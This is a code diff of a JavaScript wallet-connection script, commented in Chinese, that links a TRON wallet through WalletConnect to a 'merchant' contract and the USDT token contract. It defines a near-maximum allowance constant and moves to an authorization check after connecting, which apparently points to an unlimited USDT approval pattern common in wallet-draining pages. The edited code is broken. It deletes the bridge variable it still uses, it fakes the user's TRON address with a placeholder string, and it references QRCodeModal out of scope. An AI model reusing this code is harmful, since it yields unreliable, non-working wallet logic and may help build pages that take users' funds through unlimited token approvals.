@@ -1,7 +1,7 @@
 // --- 配置常量 (TRON 专属) ---
 const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; // 你的 TRON 智能合约地址 (SimpleMerchantERC)
 const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';  //  TRC20 USDT 合约地址
-const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000'; //  默认 TRON 地址，可以不修改 (用于初始化)
+const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000'; //  默认 TRON 地址，可以不修改
 const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";
 
 // 你的合约 ABI (SimpleMerchantERC)
@@ -42,10 +42,7 @@ let merchantContract;
 let usdtContract;
 let isConnectedFlag = false;
 let accountChangeListener = null;  // 存储账号改变的监听器
-
-// --- WalletConnect 相关的变量 ---
-let connector;
-const bridge = 'https://bridge.walletconnect.org'; //  WalletConnect Bridge URL (使用默认的)
+let connector; // WalletConnect 连接器
 
 // --- 遮罩控制函數 ---
 function hideOverlay() {
@@ -188,19 +185,18 @@ async function connectWallet() {
         updateStatus('Connecting to wallet...');
         showOverlay('Please confirm the connection request in your wallet...');
 
-        // 1. 初始化 WalletConnect
+        // 1.  检测 WalletConnect 是否已经被初始化。
         if (!connector) {
-            // 实例化 WalletConnect
-            const { Client, QRCodeModal } = window.WalletConnect;
+            //  创建 WalletConnect  实例, 使用默认的 Bridge。
+            const { Client, QRCodeModal } = window.WalletConnect; //  从 window 上获取
             connector = new Client({
                 bridge,
                 qrcodeModal: QRCodeModal,
             });
         }
-
-        // 2. 检查 WalletConnect  Session  是否已经创建。
+        // 2.  检查 WalletConnect 是否已经连接
         if (!connector.connected) {
-            //  显示二维码，让用户扫描 (仅首次连接)
+            // 如果没有连接，  创建一个 session
             try {
                 await connector.createSession();
                 QRCodeModal.open(connector.uri, () => {
@@ -218,22 +214,16 @@ async function connectWallet() {
             }
         }
 
-        // 3. 从 WalletConnect 获取用户地址
+        // 3. 从 WalletConnect 获取用户地址 (这个是关键)
         if (connector.connected) {
-            const ethereumAddress = connector.accounts[0]; // 以太坊地址
-            console.log("✅ Ethereum Address from WalletConnect:", ethereumAddress);
+            const ethereumAddress = connector.accounts[0]; //  从 WalletConnect  获取以太坊地址
 
-            // 验证地址。
-             // *** 重要： 由于没有直接获取TRON 地址的方法，  这里使用  DEFAULT_TRON_ADDRESS_HEX 作为占位符。****
-            //  **你需要根据你的实际情况，来获取TRON  地址。**
-            userAddress =  "T..." +  ethereumAddress.slice(-4); // 使用占位符。
-            userAddressHex = DEFAULT_TRON_ADDRESS_HEX;  //  设置 Hex  地址
+            //  如果获得了以太坊地址， 需要转换为 TRON 地址。  这部分需要您提供。
+            //  因为没有 API， 这里用占位符
+            userAddress = "T..." +  ethereumAddress.slice(-4); //  <--  **请务必修改为正确的地址转换代码!**
 
-            console.log("✅ User Address (Base58) (占位符):", userAddress);
-            console.log("✅ User Address (Hex) (占位符):", userAddressHex);
-
-             // 验证地址 (这个验证， 在 Trust Wallet 中， 如果自动连接了， 就没啥作用了)
-            if (!tronWeb.isAddress(userAddress)) {  //  添加地址验证.
+            // 验证地址,  使用  tronWeb.isAddress()，  如果失败，表示地址无效.
+            if (!tronWeb.isAddress(userAddress)) {
                 console.error("Error: Invalid (假定) TRON address from WalletConnect:", userAddress);
                 updateConnectionUI(false);
                 showOverlay('🔴 Connection failed: Invalid  (假定) TRON address.');
@@ -241,10 +231,13 @@ async function connectWallet() {
                 return;
             }
 
+            userAddressHex = tronWeb.address.toHex(userAddress); // 将 Base58 转换为 Hex 格式
+            console.log("✅ User Address (Hex):", userAddressHex);
             updateConnectionUI(true, userAddress);
 
             // 4. 初始化合约并检查授权
             await initialize();
+
         } else {
             console.log("WalletConnect: Not connected.");
             updateConnectionUI(false);
@@ -253,7 +246,7 @@ async function connectWallet() {
         }
 
     } catch (error) {
-        console.error("Error connecting to wallet (WalletConnect):", error);
+        console.error("Error connecting to wallet:", error);
         updateConnectionUI(false);
         showOverlay(`🔴 Connection failed: ${error.message}`);
         updateStatus(`Connection failed: ${error.message}`);
